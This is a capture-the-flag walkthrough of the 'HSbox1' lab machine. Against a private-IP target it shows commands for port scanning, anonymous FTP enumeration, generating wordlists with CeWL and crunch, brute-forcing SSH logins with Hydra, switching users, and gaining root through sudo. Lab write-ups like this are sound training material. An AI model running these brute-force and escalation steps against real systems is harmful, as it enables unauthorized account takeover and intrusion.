HSbox1 – Cybersecurity

📌 Overview

HSbox1 designed to practice network enumeration, service discovery, password auditing, Linux user enumeration, and privilege escalation in an authorized environment.

🎯 Objectives

- Identify open ports and running services.
- Enumerate FTP and HTTP services.
- Discover usernames and generate custom wordlists.
- Perform SSH password auditing.
- Switch between local users.
- Identify potential privilege-escalation paths.
- Obtain root access and locate the final flag.

🖥️ Lab Information

Detail| Information
Machine Name| HSbox1
Platform| Hacker School Lab
Attacking Machine| Kali Linux
Target IP| "192.168.1.82"
Difficulty| Not specified
Objective| Find flags and obtain authorized access

🛠️ Tools Used

- Nmap – Port scanning and service enumeration
- FTP – File and anonymous-access enumeration
- CeWL – Custom wordlist generation
- Hydra – SSH password auditing
- Crunch – Wordlist generation
- SSH – Remote login
- Linux commands – File discovery and user enumeration
- Sudo – Privilege escalation analysis

🔎 Methodology

1. Network Enumeration

Scan all TCP ports and identify running services and their versions.

nmap -sC -sV -p- 192.168.1.82

Services identified in the lab:

- FTP — Port "21"
- HTTP — Port "1515"
- SSH — Port "3535"
<img width="1133" height="582" alt="port specifi scan" src="https://github.com/user-attachments/assets/9527326c-7e32-413e-9ec8-606e9cb5b423" />



2. FTP Enumeration

Check whether anonymous FTP access is permitted and inspect accessible files.

ftp 192.168.1.82
<img width="1004" height="473" alt="ftp enumeration" src="https://github.com/user-attachments/assets/5cf02f9b-aa15-4d18-b012-8ce2b41aaa73" />

The lab's "note.txt" file revealed the username "jack".
<img width="1462" height="584" alt="ftp login" src="https://github.com/user-attachments/assets/a0ff57f1-f8db-4691-b296-9e29e7cc4c73" />

3. HTTP Enumeration
Open the target website in a browser:
http://192.168.1.82:1515
<img width="896" height="379" alt="http" src="https://github.com/user-attachments/assets/a521d920-396e-4814-9b47-94ee459f94ba" />
Use CeWL to generate a custom wordlist from the website content:

cewl http://192.168.1.82:1515 -w jackpassword.txt

4. SSH Password Auditing

Use the generated wordlist to audit SSH credentials in the authorized lab.

hydra -l jack -P jackpassword.txt ssh://192.168.1.82:3535

The documented lab result identified the password for "jack". Use the credentials obtained in your own lab to continue.

5. User Enumeration

After obtaining authorized SSH access, inspect the user's files and read the available notes.

ls -la
cat note.txt

The notes provided a clue for the next user, "goblin".

6. Wordlist Generation

The lab specified a four-character password containing the characters "a", "c", "1", and "5".

crunch 4 4 ac15 -o goblinpassword.txt

Use the generated wordlist for authorized SSH password auditing:

hydra -l goblin -P goblinpassword.txt ssh://192.168.1.82:3535

The documented result identified the password for the "goblin" account.

7. File Enumeration

Switch to the discovered account and inspect its notes.

su goblin
ls -la
cat note

Search for the script mentioned in the notes:

find / -type f -name "final.sh" 2>/dev/null

Inspect the script to understand its permissions and potential privilege-escalation implications.

8. Privilege Escalation

Review the script and check the account's permitted sudo commands:

sudo -l
<img width="1012" height="381" alt="sudo escaltion" src="https://github.com/user-attachments/assets/a29f6ded-6254-4e66-b6a2-037ce0e66c6c" />


The lab report documents obtaining root access with:

sudo -i
<img width="1026" height="499" alt="sudo version escalation" src="https://github.com/user-attachments/assets/f2a15945-57ba-4f8e-9b87-07ef54aebdce" />


This works only when the account has sufficient sudo privileges. Inspect the script and verify the relevant permissions before drawing conclusions about the escalation path.

9. Flag Discovery

After obtaining authorized root access, inspect the root directory and locate the flag file.

ls -la /root
cat /root/flag.txt
<img width="1174" height="162" alt="flag" src="https://github.com/user-attachments/assets/7cd2803b-fadf-4bfe-8548-94c805d5466b" />



Record the flag locally for your lab documentation. Avoid publishing sensitive credentials or flag values if the lab provider restricts disclosure.

📚 Key Learnings

- Full-port scanning and service-version detection
- FTP anonymous-access enumeration
- HTTP content analysis and custom wordlist generation
- SSH authentication testing
- Linux file and user enumeration
- Shell script and sudo-permission analysis
- Privilege-escalation investigation
- Technical documentation and evidence collection
